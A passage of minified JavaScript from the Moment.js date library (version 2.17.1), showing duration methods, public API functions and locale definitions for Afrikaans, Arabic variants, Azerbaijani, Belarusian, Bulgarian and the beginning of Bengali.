        e ? this._weekdaysStrictRegex : this._weekdaysRegex) : (g(this, "_weekdaysRegex") || (this._weekdaysRegex = bn),
        this._weekdaysStrictRegex && e ? this._weekdaysStrictRegex : this._weekdaysRegex)
    }
    ,
    Xn.weekdaysShortRegex = function(e) {
        return this._weekdaysParseExact ? (g(this, "_weekdaysRegex") || Q.call(this),
        e ? this._weekdaysShortStrictRegex : this._weekdaysShortRegex) : (g(this, "_weekdaysShortRegex") || (this._weekdaysShortRegex = kn),
        this._weekdaysShortStrictRegex && e ? this._weekdaysShortStrictRegex : this._weekdaysShortRegex)
    }
    ,
    Xn.weekdaysMinRegex = function(e) {
        return this._weekdaysParseExact ? (g(this, "_weekdaysRegex") || Q.call(this),
        e ? this._weekdaysMinStrictRegex : this._weekdaysMinRegex) : (g(this, "_weekdaysMinRegex") || (this._weekdaysMinRegex = Dn),
        this._weekdaysMinStrictRegex && e ? this._weekdaysMinStrictRegex : this._weekdaysMinRegex)
    }
    ,
    Xn.isPM = function(e) {
        return "p" === (e + "").toLowerCase().charAt(0)
    }
    ,
    Xn.meridiem = function(e, t, n) {
        return 11 < e ? n ? "pm" : "PM" : n ? "am" : "AM"
    }
    ,
    ae("en", {
        ordinalParse: /\d{1,2}(th|st|nd|rd)/,
        ordinal: function(e) {
            var t = e % 10;
            return e + (1 === b(e % 100 / 10) ? "th" : 1 == t ? "st" : 2 == t ? "nd" : 3 == t ? "rd" : "th")
        }
    }),
    _.lang = e("moment.lang is deprecated. Use moment.locale instead.", ae),
    _.langData = e("moment.langData is deprecated. Use moment.localeData instead.", re);
    var Kn = Math.abs
      , Qn = ze("ms")
      , Zn = ze("s")
      , ei = ze("m")
      , ti = ze("h")
      , ni = ze("d")
      , ii = ze("w")
      , ai = ze("M")
      , si = ze("y")
      , ri = Re("milliseconds")
      , oi = Re("seconds")
      , li = Re("minutes")
      , di = Re("hours")
      , ui = Re("days")
      , ci = Re("months")
      , hi = Re("years")
      , mi = Math.round
      , fi = {
        s: 45,
        m: 45,
        h: 22,
        d: 26,
        M: 11
    }
      , pi = Math.abs
      , _i = _e.prototype;
    _i.abs = function() {
        var e = this._data;
        return this._milliseconds = Kn(this._milliseconds),
        this._days = Kn(this._days),
        this._months = Kn(this._months),
        e.milliseconds = Kn(e.milliseconds),
        e.seconds = Kn(e.seconds),
        e.minutes = Kn(e.minutes),
        e.hours = Kn(e.hours),
        e.months = Kn(e.months),
        e.years = Kn(e.years),
        this
    }
    ,
    _i.add = function(e, t) {
        return Ne(this, e, t, 1)
    }
    ,
    _i.subtract = function(e, t) {
        return Ne(this, e, t, -1)
    }
    ,
    _i.as = function(e) {
        var t, n, i = this._milliseconds;
        if ("month" === (e = S(e)) || "year" === e)
            return t = this._days + i / 864e5,
            n = this._months + We(t),
            "month" === e ? n : n / 12;
        switch (t = this._days + Math.round(Ie(this._months)),
        e) {
        case "week":
            return t / 7 + i / 6048e5;
        case "day":
            return t + i / 864e5;
        case "hour":
            return 24 * t + i / 36e5;
        case "minute":
            return 1440 * t + i / 6e4;
        case "second":
            return 86400 * t + i / 1e3;
        case "millisecond":
            return Math.floor(864e5 * t) + i;
        default:
            throw new Error("Unknown unit " + e)
        }
    }
    ,
    _i.asMilliseconds = Qn,
    _i.asSeconds = Zn,
    _i.asMinutes = ei,
    _i.asHours = ti,
    _i.asDays = ni,
    _i.asWeeks = ii,
    _i.asMonths = ai,
    _i.asYears = si,
    _i.valueOf = function() {
        return this._milliseconds + 864e5 * this._days + this._months % 12 * 2592e6 + 31536e6 * b(this._months / 12)
    }
    ,
    _i._bubble = function() {
        var e, t, n, i, a, s = this._milliseconds, r = this._days, o = this._months, l = this._data;
        return 0 <= s && 0 <= r && 0 <= o || s <= 0 && r <= 0 && o <= 0 || (s += 864e5 * Fe(Ie(o) + r),
        o = r = 0),
        l.milliseconds = s % 1e3,
        e = L(s / 1e3),
        l.seconds = e % 60,
        t = L(e / 60),
        l.minutes = t % 60,
        n = L(t / 60),
        l.hours = n % 24,
        r += L(n / 24),
        o += a = L(We(r)),
        r -= Fe(Ie(a)),
        i = L(o / 12),
        o %= 12,
        l.days = r,
        l.months = o,
        l.years = i,
        this
    }
    ,
    _i.get = function(e) {
        return this[(e = S(e)) + "s"]()
    }
    ,
    _i.milliseconds = ri,
    _i.seconds = oi,
    _i.minutes = li,
    _i.hours = di,
    _i.days = ui,
    _i.weeks = function() {
        return L(this.days() / 7)
    }
    ,
    _i.months = ci,
    _i.years = hi,
    _i.humanize = function(e) {
        var t = this.localeData()
          , n = $e(this, !e, t);
        return e && (n = t.pastFuture(+this, n)),
        t.postformat(n)
    }
    ,
    _i.toISOString = Be,
    _i.toString = Be,
    _i.toJSON = Be,
    _i.locale = xe,
    _i.localeData = He,
    _i.toIsoString = e("toIsoString() is deprecated. Please use toISOString() instead (notice the capitals)", Be),
    _i.lang = $n,
    C("X", 0, 0, "unix"),
    C("x", 0, 0, "valueOf"),
    O("x", Xt),
    O("X", /[+-]?\d+(\.\d{1,3})?/),
    W("X", function(e, t, n) {
        n._d = new Date(1e3 * parseFloat(e, 10))
    }),
    W("x", function(e, t, n) {
        n._d = new Date(b(e))
    }),
    _.version = "2.17.1",
    wt = fe,
    _.fn = Gn,
    _.min = function() {
        return pe("isBefore", [].slice.call(arguments, 0))
    }
    ,
    _.max = function() {
        return pe("isAfter", [].slice.call(arguments, 0))
    }
    ,
    _.now = function() {
        return Date.now ? Date.now() : +new Date
    }
    ,
    _.utc = c,
    _.unix = function(e) {
        return fe(1e3 * e)
    }
    ,
    _.months = function(e, t) {
        return Pe(e, t, "months")
    }
    ,
    _.isDate = s,
    _.locale = ae,
    _.invalid = m,
    _.duration = De,
    _.isMoment = M,
    _.weekdays = function(e, t, n) {
        return Oe(e, t, n, "weekdays")
    }
    ,
    _.parseZone = function() {
        return fe.apply(null, arguments).parseZone()
    }
    ,
    _.localeData = re,
    _.isDuration = ge,
    _.monthsShort = function(e, t) {
        return Pe(e, t, "monthsShort")
    }
    ,
    _.weekdaysMin = function(e, t, n) {
        return Oe(e, t, n, "weekdaysMin")
    }
    ,
    _.defineLocale = se,
    _.updateLocale = function(e, t) {
        if (null != t) {
            var n, i = Tn;
            null != Sn[e] && (i = Sn[e]._config),
            (n = new T(t = a(i, t))).parentLocale = Sn[e],
            Sn[e] = n,
            ae(e)
        } else
            null != Sn[e] && (null != Sn[e].parentLocale ? Sn[e] = Sn[e].parentLocale : null != Sn[e] && delete Sn[e]);
        return Sn[e]
    }
    ,
    _.locales = function() {
        return Et(Sn)
    }
    ,
    _.weekdaysShort = function(e, t, n) {
        return Oe(e, t, n, "weekdaysShort")
    }
    ,
    _.normalizeUnits = S,
    _.relativeTimeRounding = function(e) {
        return void 0 === e ? mi : "function" == typeof e && (mi = e,
        !0)
    }
    ,
    _.relativeTimeThreshold = function(e, t) {
        return void 0 !== fi[e] && (void 0 === t ? fi[e] : (fi[e] = t,
        !0))
    }
    ,
    _.calendarFormat = function(e, t) {
        var n = e.diff(t, "days", !0);
        return n < -6 ? "sameElse" : n < -1 ? "lastWeek" : n < 0 ? "lastDay" : n < 1 ? "sameDay" : n < 2 ? "nextDay" : n < 7 ? "nextWeek" : "sameElse"
    }
    ,
    _.prototype = Gn,
    _.defineLocale("af", {
        months: "Januarie_Februarie_Maart_April_Mei_Junie_Julie_Augustus_September_Oktober_November_Desember".split("_"),
        monthsShort: "Jan_Feb_Mrt_Apr_Mei_Jun_Jul_Aug_Sep_Okt_Nov_Des".split("_"),
        weekdays: "Sondag_Maandag_Dinsdag_Woensdag_Donderdag_Vrydag_Saterdag".split("_"),
        weekdaysShort: "Son_Maa_Din_Woe_Don_Vry_Sat".split("_"),
        weekdaysMin: "So_Ma_Di_Wo_Do_Vr_Sa".split("_"),
        meridiemParse: /vm|nm/i,
        isPM: function(e) {
            return /^nm$/i.test(e)
        },
        meridiem: function(e, t, n) {
            return e < 12 ? n ? "vm" : "VM" : n ? "nm" : "NM"
        },
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "DD/MM/YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY HH:mm",
            LLLL: "dddd, D MMMM YYYY HH:mm"
        },
        calendar: {
            sameDay: "[Vandag om] LT",
            nextDay: "[Môre om] LT",
            nextWeek: "dddd [om] LT",
            lastDay: "[Gister om] LT",
            lastWeek: "[Laas] dddd [om] LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "oor %s",
            past: "%s gelede",
            s: "'n paar sekondes",
            m: "'n minuut",
            mm: "%d minute",
            h: "'n uur",
            hh: "%d ure",
            d: "'n dag",
            dd: "%d dae",
            M: "'n maand",
            MM: "%d maande",
            y: "'n jaar",
            yy: "%d jaar"
        },
        ordinalParse: /\d{1,2}(ste|de)/,
        ordinal: function(e) {
            return e + (1 === e || 8 === e || 20 <= e ? "ste" : "de")
        },
        week: {
            dow: 1,
            doy: 4
        }
    }),
    _.defineLocale("ar-dz", {
        months: "جانفي_فيفري_مارس_أفريل_ماي_جوان_جويلية_أوت_سبتمبر_أكتوبر_نوفمبر_ديسمبر".split("_"),
        monthsShort: "جانفي_فيفري_مارس_أفريل_ماي_جوان_جويلية_أوت_سبتمبر_أكتوبر_نوفمبر_ديسمبر".split("_"),
        weekdays: "الأحد_الإثنين_الثلاثاء_الأربعاء_الخميس_الجمعة_السبت".split("_"),
        weekdaysShort: "احد_اثنين_ثلاثاء_اربعاء_خميس_جمعة_سبت".split("_"),
        weekdaysMin: "أح_إث_ثلا_أر_خم_جم_سب".split("_"),
        weekdaysParseExact: !0,
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "DD/MM/YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY HH:mm",
            LLLL: "dddd D MMMM YYYY HH:mm"
        },
        calendar: {
            sameDay: "[اليوم على الساعة] LT",
            nextDay: "[غدا على الساعة] LT",
            nextWeek: "dddd [على الساعة] LT",
            lastDay: "[أمس على الساعة] LT",
            lastWeek: "dddd [على الساعة] LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "في %s",
            past: "منذ %s",
            s: "ثوان",
            m: "دقيقة",
            mm: "%d دقائق",
            h: "ساعة",
            hh: "%d ساعات",
            d: "يوم",
            dd: "%d أيام",
            M: "شهر",
            MM: "%d أشهر",
            y: "سنة",
            yy: "%d سنوات"
        },
        week: {
            dow: 0,
            doy: 4
        }
    });
    function gi(e) {
        return 0 === e ? 0 : 1 === e ? 1 : 2 === e ? 2 : 3 <= e % 100 && e % 100 <= 10 ? 3 : 11 <= e % 100 ? 4 : 5
    }
    function yi(r) {
        return function(e, t, n, i) {
            var a = gi(e)
              , s = Mi[r][gi(e)];
            return 2 === a && (s = s[t ? 0 : 1]),
            s.replace(/%d/i, e)
        }
    }
    var vi = {
        1: "1",
        2: "2",
        3: "3",
        4: "4",
        5: "5",
        6: "6",
        7: "7",
        8: "8",
        9: "9",
        0: "0"
    }
      , Mi = {
        s: ["أقل من ثانية", "ثانية واحدة", ["ثانيتان", "ثانيتين"], "%d ثوان", "%d ثانية", "%d ثانية"],
        m: ["أقل من دقيقة", "دقيقة واحدة", ["دقيقتان", "دقيقتين"], "%d دقائق", "%d دقيقة", "%d دقيقة"],
        h: ["أقل من ساعة", "ساعة واحدة", ["ساعتان", "ساعتين"], "%d ساعات", "%d ساعة", "%d ساعة"],
        d: ["أقل من يوم", "يوم واحد", ["يومان", "يومين"], "%d أيام", "%d يومًا", "%d يوم"],
        M: ["أقل من شهر", "شهر واحد", ["شهران", "شهرين"], "%d أشهر", "%d شهرا", "%d شهر"],
        y: ["أقل من عام", "عام واحد", ["عامان", "عامين"], "%d أعوام", "%d عامًا", "%d عام"]
    }
      , Li = ["يناير", "فبراير", "مارس", "أبريل", "مايو", "يونيو", "يوليو", "أغسطس", "سبتمبر", "أكتوبر", "نوفمبر", "ديسمبر"];
    _.defineLocale("ar-ly", {
        months: Li,
        monthsShort: Li,
        weekdays: "الأحد_الإثنين_الثلاثاء_الأربعاء_الخميس_الجمعة_السبت".split("_"),
        weekdaysShort: "أحد_إثنين_ثلاثاء_أربعاء_خميس_جمعة_سبت".split("_"),
        weekdaysMin: "ح_ن_ث_ر_خ_ج_س".split("_"),
        weekdaysParseExact: !0,
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "D/‏M/‏YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY HH:mm",
            LLLL: "dddd D MMMM YYYY HH:mm"
        },
        meridiemParse: /ص|م/,
        isPM: function(e) {
            return "م" === e
        },
        meridiem: function(e, t, n) {
            return e < 12 ? "ص" : "م"
        },
        calendar: {
            sameDay: "[اليوم عند الساعة] LT",
            nextDay: "[غدًا عند الساعة] LT",
            nextWeek: "dddd [عند الساعة] LT",
            lastDay: "[أمس عند الساعة] LT",
            lastWeek: "dddd [عند الساعة] LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "بعد %s",
            past: "منذ %s",
            s: yi("s"),
            m: yi("m"),
            mm: yi("m"),
            h: yi("h"),
            hh: yi("h"),
            d: yi("d"),
            dd: yi("d"),
            M: yi("M"),
            MM: yi("M"),
            y: yi("y"),
            yy: yi("y")
        },
        preparse: function(e) {
            return e.replace(/\u200f/g, "").replace(/،/g, ",")
        },
        postformat: function(e) {
            return e.replace(/\d/g, function(e) {
                return vi[e]
            }).replace(/,/g, "،")
        },
        week: {
            dow: 6,
            doy: 12
        }
    }),
    _.defineLocale("ar-ma", {
        months: "يناير_فبراير_مارس_أبريل_ماي_يونيو_يوليوز_غشت_شتنبر_أكتوبر_نونبر_دجنبر".split("_"),
        monthsShort: "يناير_فبراير_مارس_أبريل_ماي_يونيو_يوليوز_غشت_شتنبر_أكتوبر_نونبر_دجنبر".split("_"),
        weekdays: "الأحد_الإتنين_الثلاثاء_الأربعاء_الخميس_الجمعة_السبت".split("_"),
        weekdaysShort: "احد_اتنين_ثلاثاء_اربعاء_خميس_جمعة_سبت".split("_"),
        weekdaysMin: "ح_ن_ث_ر_خ_ج_س".split("_"),
        weekdaysParseExact: !0,
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "DD/MM/YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY HH:mm",
            LLLL: "dddd D MMMM YYYY HH:mm"
        },
        calendar: {
            sameDay: "[اليوم على الساعة] LT",
            nextDay: "[غدا على الساعة] LT",
            nextWeek: "dddd [على الساعة] LT",
            lastDay: "[أمس على الساعة] LT",
            lastWeek: "dddd [على الساعة] LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "في %s",
            past: "منذ %s",
            s: "ثوان",
            m: "دقيقة",
            mm: "%d دقائق",
            h: "ساعة",
            hh: "%d ساعات",
            d: "يوم",
            dd: "%d أيام",
            M: "شهر",
            MM: "%d أشهر",
            y: "سنة",
            yy: "%d سنوات"
        },
        week: {
            dow: 6,
            doy: 12
        }
    });
    var bi = {
        1: "١",
        2: "٢",
        3: "٣",
        4: "٤",
        5: "٥",
        6: "٦",
        7: "٧",
        8: "٨",
        9: "٩",
        0: "٠"
    }
      , ki = {
        "١": "1",
        "٢": "2",
        "٣": "3",
        "٤": "4",
        "٥": "5",
        "٦": "6",
        "٧": "7",
        "٨": "8",
        "٩": "9",
        "٠": "0"
    };
    _.defineLocale("ar-sa", {
        months: "يناير_فبراير_مارس_أبريل_مايو_يونيو_يوليو_أغسطس_سبتمبر_أكتوبر_نوفمبر_ديسمبر".split("_"),
        monthsShort: "يناير_فبراير_مارس_أبريل_مايو_يونيو_يوليو_أغسطس_سبتمبر_أكتوبر_نوفمبر_ديسمبر".split("_"),
        weekdays: "الأحد_الإثنين_الثلاثاء_الأربعاء_الخميس_الجمعة_السبت".split("_"),
        weekdaysShort: "أحد_إثنين_ثلاثاء_أربعاء_خميس_جمعة_سبت".split("_"),
        weekdaysMin: "ح_ن_ث_ر_خ_ج_س".split("_"),
        weekdaysParseExact: !0,
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "DD/MM/YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY HH:mm",
            LLLL: "dddd D MMMM YYYY HH:mm"
        },
        meridiemParse: /ص|م/,
        isPM: function(e) {
            return "م" === e
        },
        meridiem: function(e, t, n) {
            return e < 12 ? "ص" : "م"
        },
        calendar: {
            sameDay: "[اليوم على الساعة] LT",
            nextDay: "[غدا على الساعة] LT",
            nextWeek: "dddd [على الساعة] LT",
            lastDay: "[أمس على الساعة] LT",
            lastWeek: "dddd [على الساعة] LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "في %s",
            past: "منذ %s",
            s: "ثوان",
            m: "دقيقة",
            mm: "%d دقائق",
            h: "ساعة",
            hh: "%d ساعات",
            d: "يوم",
            dd: "%d أيام",
            M: "شهر",
            MM: "%d أشهر",
            y: "سنة",
            yy: "%d سنوات"
        },
        preparse: function(e) {
            return e.replace(/[١٢٣٤٥٦٧٨٩٠]/g, function(e) {
                return ki[e]
            }).replace(/،/g, ",")
        },
        postformat: function(e) {
            return e.replace(/\d/g, function(e) {
                return bi[e]
            }).replace(/,/g, "،")
        },
        week: {
            dow: 0,
            doy: 6
        }
    }),
    _.defineLocale("ar-tn", {
        months: "جانفي_فيفري_مارس_أفريل_ماي_جوان_جويلية_أوت_سبتمبر_أكتوبر_نوفمبر_ديسمبر".split("_"),
        monthsShort: "جانفي_فيفري_مارس_أفريل_ماي_جوان_جويلية_أوت_سبتمبر_أكتوبر_نوفمبر_ديسمبر".split("_"),
        weekdays: "الأحد_الإثنين_الثلاثاء_الأربعاء_الخميس_الجمعة_السبت".split("_"),
        weekdaysShort: "أحد_إثنين_ثلاثاء_أربعاء_خميس_جمعة_سبت".split("_"),
        weekdaysMin: "ح_ن_ث_ر_خ_ج_س".split("_"),
        weekdaysParseExact: !0,
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "DD/MM/YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY HH:mm",
            LLLL: "dddd D MMMM YYYY HH:mm"
        },
        calendar: {
            sameDay: "[اليوم على الساعة] LT",
            nextDay: "[غدا على الساعة] LT",
            nextWeek: "dddd [على الساعة] LT",
            lastDay: "[أمس على الساعة] LT",
            lastWeek: "dddd [على الساعة] LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "في %s",
            past: "منذ %s",
            s: "ثوان",
            m: "دقيقة",
            mm: "%d دقائق",
            h: "ساعة",
            hh: "%d ساعات",
            d: "يوم",
            dd: "%d أيام",
            M: "شهر",
            MM: "%d أشهر",
            y: "سنة",
            yy: "%d سنوات"
        },
        week: {
            dow: 1,
            doy: 4
        }
    });
    function Di(e) {
        return 0 === e ? 0 : 1 === e ? 1 : 2 === e ? 2 : 3 <= e % 100 && e % 100 <= 10 ? 3 : 11 <= e % 100 ? 4 : 5
    }
    function Yi(r) {
        return function(e, t, n, i) {
            var a = Di(e)
              , s = Si[r][Di(e)];
            return 2 === a && (s = s[t ? 0 : 1]),
            s.replace(/%d/i, e)
        }
    }
    var wi = {
        1: "١",
        2: "٢",
        3: "٣",
        4: "٤",
        5: "٥",
        6: "٦",
        7: "٧",
        8: "٨",
        9: "٩",
        0: "٠"
    }
      , Ti = {
        "١": "1",
        "٢": "2",
        "٣": "3",
        "٤": "4",
        "٥": "5",
        "٦": "6",
        "٧": "7",
        "٨": "8",
        "٩": "9",
        "٠": "0"
    }
      , Si = {
        s: ["أقل من ثانية", "ثانية واحدة", ["ثانيتان", "ثانيتين"], "%d ثوان", "%d ثانية", "%d ثانية"],
        m: ["أقل من دقيقة", "دقيقة واحدة", ["دقيقتان", "دقيقتين"], "%d دقائق", "%d دقيقة", "%d دقيقة"],
        h: ["أقل من ساعة", "ساعة واحدة", ["ساعتان", "ساعتين"], "%d ساعات", "%d ساعة", "%d ساعة"],
        d: ["أقل من يوم", "يوم واحد", ["يومان", "يومين"], "%d أيام", "%d يومًا", "%d يوم"],
        M: ["أقل من شهر", "شهر واحد", ["شهران", "شهرين"], "%d أشهر", "%d شهرا", "%d شهر"],
        y: ["أقل من عام", "عام واحد", ["عامان", "عامين"], "%d أعوام", "%d عامًا", "%d عام"]
    }
      , xi = ["كانون الثاني يناير", "شباط فبراير", "آذار مارس", "نيسان أبريل", "أيار مايو", "حزيران يونيو", "تموز يوليو", "آب أغسطس", "أيلول سبتمبر", "تشرين الأول أكتوبر", "تشرين الثاني نوفمبر", "كانون الأول ديسمبر"];
    _.defineLocale("ar", {
        months: xi,
        monthsShort: xi,
        weekdays: "الأحد_الإثنين_الثلاثاء_الأربعاء_الخميس_الجمعة_السبت".split("_"),
        weekdaysShort: "أحد_إثنين_ثلاثاء_أربعاء_خميس_جمعة_سبت".split("_"),
        weekdaysMin: "ح_ن_ث_ر_خ_ج_س".split("_"),
        weekdaysParseExact: !0,
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "D/‏M/‏YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY HH:mm",
            LLLL: "dddd D MMMM YYYY HH:mm"
        },
        meridiemParse: /ص|م/,
        isPM: function(e) {
            return "م" === e
        },
        meridiem: function(e, t, n) {
            return e < 12 ? "ص" : "م"
        },
        calendar: {
            sameDay: "[اليوم عند الساعة] LT",
            nextDay: "[غدًا عند الساعة] LT",
            nextWeek: "dddd [عند الساعة] LT",
            lastDay: "[أمس عند الساعة] LT",
            lastWeek: "dddd [عند الساعة] LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "بعد %s",
            past: "منذ %s",
            s: Yi("s"),
            m: Yi("m"),
            mm: Yi("m"),
            h: Yi("h"),
            hh: Yi("h"),
            d: Yi("d"),
            dd: Yi("d"),
            M: Yi("M"),
            MM: Yi("M"),
            y: Yi("y"),
            yy: Yi("y")
        },
        preparse: function(e) {
            return e.replace(/\u200f/g, "").replace(/[١٢٣٤٥٦٧٨٩٠]/g, function(e) {
                return Ti[e]
            }).replace(/،/g, ",")
        },
        postformat: function(e) {
            return e.replace(/\d/g, function(e) {
                return wi[e]
            }).replace(/,/g, "،")
        },
        week: {
            dow: 6,
            doy: 12
        }
    });
    var Hi = {
        1: "-inci",
        5: "-inci",
        8: "-inci",
        70: "-inci",
        80: "-inci",
        2: "-nci",
        7: "-nci",
        20: "-nci",
        50: "-nci",
        3: "-üncü",
        4: "-üncü",
        100: "-üncü",
        6: "-ncı",
        9: "-uncu",
        10: "-uncu",
        30: "-uncu",
        60: "-ıncı",
        90: "-ıncı"
    };
    _.defineLocale("az", {
        months: "yanvar_fevral_mart_aprel_may_iyun_iyul_avqust_sentyabr_oktyabr_noyabr_dekabr".split("_"),
        monthsShort: "yan_fev_mar_apr_may_iyn_iyl_avq_sen_okt_noy_dek".split("_"),
        weekdays: "Bazar_Bazar ertəsi_Çərşənbə axşamı_Çərşənbə_Cümə axşamı_Cümə_Şənbə".split("_"),
        weekdaysShort: "Baz_BzE_ÇAx_Çər_CAx_Cüm_Şən".split("_"),
        weekdaysMin: "Bz_BE_ÇA_Çə_CA_Cü_Şə".split("_"),
        weekdaysParseExact: !0,
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "DD.MM.YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY HH:mm",
            LLLL: "dddd, D MMMM YYYY HH:mm"
        },
        calendar: {
            sameDay: "[bugün saat] LT",
            nextDay: "[sabah saat] LT",
            nextWeek: "[gələn həftə] dddd [saat] LT",
            lastDay: "[dünən] LT",
            lastWeek: "[keçən həftə] dddd [saat] LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "%s sonra",
            past: "%s əvvəl",
            s: "birneçə saniyyə",
            m: "bir dəqiqə",
            mm: "%d dəqiqə",
            h: "bir saat",
            hh: "%d saat",
            d: "bir gün",
            dd: "%d gün",
            M: "bir ay",
            MM: "%d ay",
            y: "bir il",
            yy: "%d il"
        },
        meridiemParse: /gecə|səhər|gündüz|axşam/,
        isPM: function(e) {
            return /^(gündüz|axşam)$/.test(e)
        },
        meridiem: function(e, t, n) {
            return e < 4 ? "gecə" : e < 12 ? "səhər" : e < 17 ? "gündüz" : "axşam"
        },
        ordinalParse: /\d{1,2}-(ıncı|inci|nci|üncü|ncı|uncu)/,
        ordinal: function(e) {
            if (0 === e)
                return e + "-ıncı";
            var t = e % 10;
            return e + (Hi[t] || Hi[e % 100 - t] || Hi[100 <= e ? 100 : null])
        },
        week: {
            dow: 1,
            doy: 7
        }
    }),
    _.defineLocale("be", {
        months: {
            format: "студзеня_лютага_сакавіка_красавіка_траўня_чэрвеня_ліпеня_жніўня_верасня_кастрычніка_лістапада_снежня".split("_"),
            standalone: "студзень_люты_сакавік_красавік_травень_чэрвень_ліпень_жнівень_верасень_кастрычнік_лістапад_снежань".split("_")
        },
        monthsShort: "студ_лют_сак_крас_трав_чэрв_ліп_жнів_вер_каст_ліст_снеж".split("_"),
        weekdays: {
            format: "нядзелю_панядзелак_аўторак_сераду_чацвер_пятніцу_суботу".split("_"),
            standalone: "нядзеля_панядзелак_аўторак_серада_чацвер_пятніца_субота".split("_"),
            isFormat: /\[ ?[Вв] ?(?:мінулую|наступную)? ?\] ?dddd/
        },
        weekdaysShort: "нд_пн_ат_ср_чц_пт_сб".split("_"),
        weekdaysMin: "нд_пн_ат_ср_чц_пт_сб".split("_"),
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "DD.MM.YYYY",
            LL: "D MMMM YYYY г.",
            LLL: "D MMMM YYYY г., HH:mm",
            LLLL: "dddd, D MMMM YYYY г., HH:mm"
        },
        calendar: {
            sameDay: "[Сёння ў] LT",
            nextDay: "[Заўтра ў] LT",
            lastDay: "[Учора ў] LT",
            nextWeek: function() {
                return "[У] dddd [ў] LT"
            },
            lastWeek: function() {
                switch (this.day()) {
                case 0:
                case 3:
                case 5:
                case 6:
                    return "[У мінулую] dddd [ў] LT";
                case 1:
                case 2:
                case 4:
                    return "[У мінулы] dddd [ў] LT"
                }
            },
            sameElse: "L"
        },
        relativeTime: {
            future: "праз %s",
            past: "%s таму",
            s: "некалькі секунд",
            m: qe,
            mm: qe,
            h: qe,
            hh: qe,
            d: "дзень",
            dd: qe,
            M: "месяц",
            MM: qe,
            y: "год",
            yy: qe
        },
        meridiemParse: /ночы|раніцы|дня|вечара/,
        isPM: function(e) {
            return /^(дня|вечара)$/.test(e)
        },
        meridiem: function(e, t, n) {
            return e < 4 ? "ночы" : e < 12 ? "раніцы" : e < 17 ? "дня" : "вечара"
        },
        ordinalParse: /\d{1,2}-(і|ы|га)/,
        ordinal: function(e, t) {
            switch (t) {
            case "M":
            case "d":
            case "DDD":
            case "w":
            case "W":
                return e % 10 != 2 && e % 10 != 3 || e % 100 == 12 || e % 100 == 13 ? e + "-ы" : e + "-і";
            case "D":
                return e + "-га";
            default:
                return e
            }
        },
        week: {
            dow: 1,
            doy: 7
        }
    }),
    _.defineLocale("bg", {
        months: "януари_февруари_март_април_май_юни_юли_август_септември_октомври_ноември_декември".split("_"),
        monthsShort: "янр_фев_мар_апр_май_юни_юли_авг_сеп_окт_ное_дек".split("_"),
        weekdays: "неделя_понеделник_вторник_сряда_четвъртък_петък_събота".split("_"),
        weekdaysShort: "нед_пон_вто_сря_чет_пет_съб".split("_"),
        weekdaysMin: "нд_пн_вт_ср_чт_пт_сб".split("_"),
        longDateFormat: {
            LT: "H:mm",
            LTS: "H:mm:ss",
            L: "D.MM.YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY H:mm",
            LLLL: "dddd, D MMMM YYYY H:mm"
        },
        calendar: {
            sameDay: "[Днес в] LT",
            nextDay: "[Утре в] LT",
            nextWeek: "dddd [в] LT",
            lastDay: "[Вчера в] LT",
            lastWeek: function() {
                switch (this.day()) {
                case 0:
                case 3:
                case 6:
                    return "[В изминалата] dddd [в] LT";
                case 1:
                case 2:
                case 4:
                case 5:
                    return "[В изминалия] dddd [в] LT"
                }
            },
            sameElse: "L"
        },
        relativeTime: {
            future: "след %s",
            past: "преди %s",
            s: "няколко секунди",
            m: "минута",
            mm: "%d минути",
            h: "час",
            hh: "%d часа",
            d: "ден",
            dd: "%d дни",
            M: "месец",
            MM: "%d месеца",
            y: "година",
            yy: "%d години"
        },
        ordinalParse: /\d{1,2}-(ев|ен|ти|ви|ри|ми)/,
        ordinal: function(e) {
            var t = e % 10
              , n = e % 100;
            return 0 === e ? e + "-ев" : 0 == n ? e + "-ен" : 10 < n && n < 20 ? e + "-ти" : 1 == t ? e + "-ви" : 2 == t ? e + "-ри" : 7 == t || 8 == t ? e + "-ми" : e + "-ти"
        },
        week: {
            dow: 1,
            doy: 7
        }
    });
    var Ei = {
        1: "১",
        2: "২",
        3: "৩",
        4: "৪",
        5: "৫",
        6: "৬",
        7: "৭",
        8: "৮",
        9: "৯",
        0: "০"
    }
      , ji = {
        "১": "1",
        "২": "2",
        "৩": "3",
        "৪": "4",
        "৫": "5",
        "৬": "6",
        "৭": "7",
        "৮": "8",
        "৯": "9",
        "০": "0"
    };
    _.defineLocale("bn", {
        months: "জানুয়ারী_ফেব্রুয়ারি_মার্চ_এপ্রিল_মে_জুন_জুলাই_আগস্ট_সেপ্টেম্বর_অক্টোবর_নভেম্বর_ডিসেম্বর".split("_"),
        monthsShort: "জানু_ফেব_মার্চ_এপ্র_মে_জুন_জুল_আগ_সেপ্ট_অক্টো_নভে_ডিসে".split("_"),
        weekdays: "রবিবার_সোমবার_মঙ্গলবার_বুধবার_বৃহস্পতিবার_শুক্রবার_শনিবার".split("_"),
